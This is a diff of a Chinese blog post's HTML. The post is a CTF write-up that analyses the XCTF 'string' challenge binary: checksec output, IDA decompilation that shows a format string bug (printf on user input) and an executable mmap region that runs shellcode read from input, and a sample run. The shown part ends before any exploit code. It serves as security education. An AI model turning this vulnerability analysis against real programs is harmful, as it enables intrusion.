@@ -418,16 +418,12 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="font-color-navy0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-前言font"></a> <font color="navy"><code>0x00 前言</code></font></h3>
-<p>      在上一篇“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的<code>string</code>题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”。</p>
-<h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3>
-<h4 id="1查看-elf-文件"><a class="markdownIt-Anchor" href="#1查看-elf-文件"></a> <code>1.查看 ELF 文件</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br></pre></td></tr></table></figure>
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><font color="navy"><code>0x00 前言</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一篇“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的<code>string</code>题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”。</p>
+<h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><h4 id="1-查看-ELF-文件"><a href="#1-查看-ELF-文件" class="headerlink" title="1.查看 ELF 文件"></a><code>1.查看 ELF 文件</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>从上述信息可以看出<code>pwn</code>是一个x86-64位的ELF文件</p>
 </blockquote>
-<h4 id="2查看文件保护机制"><a class="markdownIt-Anchor" href="#2查看文件保护机制"></a> <code>2.查看文件保护机制</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h4 id="2-查看文件保护机制"><a href="#2-查看文件保护机制" class="headerlink" title="2.查看文件保护机制"></a><code>2.查看文件保护机制</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>从上述信息中可以看出：</p>
 <ul>
@@ -438,8 +434,7 @@ height:50vh;
 <li>没有开启地址随机化</li>
 </ul>
 </blockquote>
-<h4 id="3用-ida-逆向"><a class="markdownIt-Anchor" href="#3用-ida-逆向"></a> <code>3.用 IDA 逆向</code></h4>
-<blockquote>
+<h4 id="3-用-IDA-逆向"><a href="#3-用-IDA-逆向" class="headerlink" title="3.用 IDA 逆向"></a><code>3.用 IDA 逆向</code></h4><blockquote>
 <p>下面我将 IDA 逆向的结果放在一起：</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">// main函数</span><br><span class="line">// 内部含有的函数：sub_400D72(v5);</span><br><span class="line">// 功能：打印v5的地址</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // ST88_8@1</span><br><span class="line">  _DWORD *v4; // rax@1</span><br><span class="line">  __int64 v5; // ST18_8@1</span><br><span class="line">  __int64 result; // rax@1</span><br><span class="line">  __int64 v7; // rdx@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_400996(60LL, 0LL);</span><br><span class="line">  v4 = malloc(8uLL);</span><br><span class="line">  v5 = (__int64)v4;</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br><span class="line">  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);</span><br><span class="line">  puts(&quot;we will tell you two secret ...&quot;);</span><br><span class="line">  printf(&quot;secret[0] is %x\n&quot;, v5, a2);</span><br><span class="line">  printf(&quot;secret[1] is %x\n&quot;, v5 + 4);</span><br><span class="line">  puts(&quot;do not tell anyone &quot;);</span><br><span class="line">  sub_400D72(v5);</span><br><span class="line">  puts(&quot;The End.....Really?&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400D72(v5);</span><br><span class="line">// 内部含有的函数：sub_400A7D(&quot;Creating a new player.&quot;);sub_400BB9();sub_400CA6(a1);</span><br><span class="line">// 功能：创建角色名称，长度不能超过13</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+10h] [bp-20h]@1</span><br><span class="line">  __int64 v3; // [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;What should your character&apos;s name be:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;, &amp;s);</span><br><span class="line">  if ( strlen(&amp;s) &lt;= 0xC )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&apos;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400A7D();</span><br><span class="line">// 内部包含的函数：sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">// 功能：要求输入“east”才可进行下一步</span><br><span class="line"></span><br><span class="line">__int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1; // [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&apos;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_4009DD();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// </span><br><span class="line"></span><br><span class="line">void __noreturn sub_4009DD()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax@1</span><br><span class="line">  int v1; // eax@2</span><br><span class="line">  int v2; // [sp+0h] [bp-10h]@2</span><br><span class="line">  unsigned int v3; // [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v4; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;You go right, suddenly, a big hole appear front you!&quot;);</span><br><span class="line">  puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    v3 = ((((unsigned int)v1 &gt;&gt; 31) + (_BYTE)v1) &amp; 1) - ((unsigned int)v1 &gt;&gt; 31);</span><br><span class="line">    _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">    if ( v2 != v3 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;You escape it!but another hole appear!&quot;);</span><br><span class="line">    puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;YOU ARE DEAD&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400BB9();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// 功能：输入一个地址、wish（存在格式化漏洞）</span><br><span class="line"></span><br><span class="line">__int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-7Ch]@1</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-78h]@1</span><br><span class="line">  char format; // [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v4; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400CA6(a1);</span><br><span class="line">// 内部包含的函数：mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">// 功能：当满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4) 条件的时候，可以直接输入shellcode，执行我们需要的代码</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400CA6(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi@2</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    read(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br></pre></td></tr></table></figure>
@@ -450,15 +445,13 @@ height:50vh;
 <blockquote>
 <p>从上面的图中可以得出这样的结论：</p>
 <ul>
-<li>
-<p>要想使程序执行shellcode就需要使<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>条件成立</p>
+<li><p>要想使程序执行shellcode就需要使<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>条件成立</p>
 </li>
-<li>
-<p>该程序一共有 <code>5</code> 处输入，要想程序成功执行shellcode，其中前三个输入被要求为：</p>
+<li><p>该程序一共有 <code>5</code> 处输入，要想程序成功执行shellcode，其中前三个输入被要求为：</p>
 <ul>
-<li><code>What should your character's name be:</code> 要求长度不超过13的字符串</li>
+<li><code>What should your character&#39;s name be:</code> 要求长度不超过13的字符串</li>
 <li><code>So, where you will go?east or up?:</code> 要求输入<code>east</code></li>
-<li><code>go into there(1), or leave(0)?:</code> 要求输入<code>1</code>’</li>
+<li><code>go into there(1), or leave(0)?:</code> 要求输入<code>1</code>‘</li>
 </ul>
 <p>其中后面两个输入都可以被利用，后面会一一进行讲解</p>
 <ul>
@@ -469,28 +462,23 @@ height:50vh;
 <p>目前上述信息是通过IDA逆向后能到的信息，下面我们简单的运行一下该程序</p>
 </blockquote>
 <p><code>知识点1：mmap();函数</code><sup>[1]</sup></p>
-<p>      当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。</p>
-<p>      原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。</p>
-<h4 id="4运行-pwn"><a class="markdownIt-Anchor" href="#4运行-pwn"></a> <code>4.运行 pwn</code></h4>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Dragon Games!</span><br><span class="line">                                                 .~)&gt;&gt;</span><br><span class="line">                                               .~))))&gt;&gt;&gt;</span><br><span class="line">                                             .~))&gt;&gt;             ___\</span><br><span class="line">                                           .~))&gt;&gt;)))&gt;&gt;      .-~))&gt;&gt;\</span><br><span class="line">                                         .~)))))&gt;&gt;       .-~))&gt;&gt;)&gt;   </span><br><span class="line">                                       .~)))&gt;&gt;))))&gt;&gt;  .-~)&gt;&gt;)&gt;       </span><br><span class="line">                   )                 .~))&gt;&gt;))))&gt;&gt;  .-~)))))&gt;&gt;)&gt;</span><br><span class="line">                ( )@@*)             //)&gt;))))))  .-~))))&gt;&gt;)&gt;</span><br><span class="line">              ).@(@@               //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">            (( @.@).              //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">          ))  )@@*.@@ )          //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt;</span><br><span class="line">       ((  ((@@@.@@             |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt;</span><br><span class="line">      )) @@*. )@@ )   (\_(\  |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">    (( @@@(.@(@ .    _/`-`  ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">     )* @@@ )@*     (@) (@)  |))) //))))))&gt;&gt;))))&gt;&gt;</span><br><span class="line">   (( @. )@( @ .   _/       / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._</span><br><span class="line">    )@@ (@@*)@@.  (6,   6) / ^ )//))))))&gt;&gt;)))&gt;&gt;   ~~-.</span><br><span class="line"> ( @jgs@@. @@@.*@_ ~^~^~, /\  ^ /)&gt;&gt;))))&gt;&gt;      _.     `,</span><br><span class="line">  ((@@ @@@*.(@@ .   \^^^/&apos; (  ^  )))&gt;&gt;        .&apos;         `,</span><br><span class="line">   ((@@).*@@ )@ )    `-&apos;   ((   ^  ~)_          /             `,</span><br><span class="line">     (@@. (@@ ).           (((   ^    `\        |               `.</span><br><span class="line">       (*.@*              / ((((        \        \      .         `.</span><br><span class="line">                         /   (((((  \    \    _.-~\     Y,         ;</span><br><span class="line">                        /   / (((((( \    \.-~   _.`&quot; _.-~`,       ;</span><br><span class="line">                       /   /   `(((((()    )    (((((~      `,     ;</span><br><span class="line">                     _/  _/      `&quot;&quot;&quot;/   /&apos;                  ;     ;</span><br><span class="line">                 _.-~_.-~           /  /&apos;                _.-~   _.&apos;</span><br><span class="line">               ((((~~              / /&apos;              _.-~ __.--~</span><br><span class="line">                                  ((((          __.-~ _.-~</span><br><span class="line">                                              .&apos;   .~~</span><br><span class="line">                                              :    ,&apos;</span><br><span class="line"></span><br><span class="line">we are wizard, we will give you hand, you can not defeat dragon by yourself ...</span><br><span class="line">we will tell you two secret ...</span><br><span class="line">secret[0] is 15812a0</span><br><span class="line">secret[1] is 15812a4</span><br><span class="line">do not tell anyone </span><br><span class="line">What should your character&apos;s name be:							// 第1处输入</span><br><span class="line">&gt; hello,world!</span><br><span class="line"></span><br><span class="line">Creating a new player.</span><br><span class="line"> This is a famous but quite unusual inn. The air is fresh and the</span><br><span class="line">marble-tiled ground is clean. Few rowdy guests can be seen, and the</span><br><span class="line">furniture looks undamaged by brawls, which are very common in other pubs</span><br><span class="line">all around the world. The decoration looks extremely valuable and would fit</span><br><span class="line">into a palace, but in this city it&apos;s quite ordinary. In the middle of the</span><br><span class="line">room are velvet covered chairs and benches, which surround large oaken</span><br><span class="line">tables. A large sign is fixed to the northern wall behind a wooden bar. In</span><br><span class="line">one corner you notice a fireplace.</span><br><span class="line">There are two obvious exits: east, up.</span><br><span class="line">But strange thing is ,no one there.</span><br><span class="line">So, where you will go?east or up?:								// 第2处输入</span><br><span class="line">&gt; east				</span><br><span class="line"></span><br><span class="line">You travel a short distance east.That&apos;s odd, anyone disappear suddenly</span><br><span class="line">, what happend?! You just travel , and find another hole</span><br><span class="line">You recall, a big black hole will suckk you into it! Know what should you do?</span><br><span class="line">go into there(1), or leave(0)?:									// 第3处输入</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">A voice heard in your mind</span><br><span class="line">&apos;Give me an address&apos;											// 第4处输入</span><br><span class="line">&gt; 1111</span><br><span class="line"></span><br><span class="line">And, you wish is:												// 第5处输入</span><br><span class="line">&gt; nihao</span><br><span class="line"></span><br><span class="line">Your wish is</span><br><span class="line">nihaoI hear it, I hear it....</span><br><span class="line">Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!</span><br><span class="line">Dragon say: HaHa! you were supposed to have a normal</span><br><span class="line">RPG game, but I have changed it! you have no weapon and </span><br><span class="line">skill! you could not defeat me !</span><br><span class="line">That&apos;s sound terrible! you meet final boss!but you level is ONE!</span><br><span class="line">The End.....Really?</span><br></pre></td></tr></table></figure>
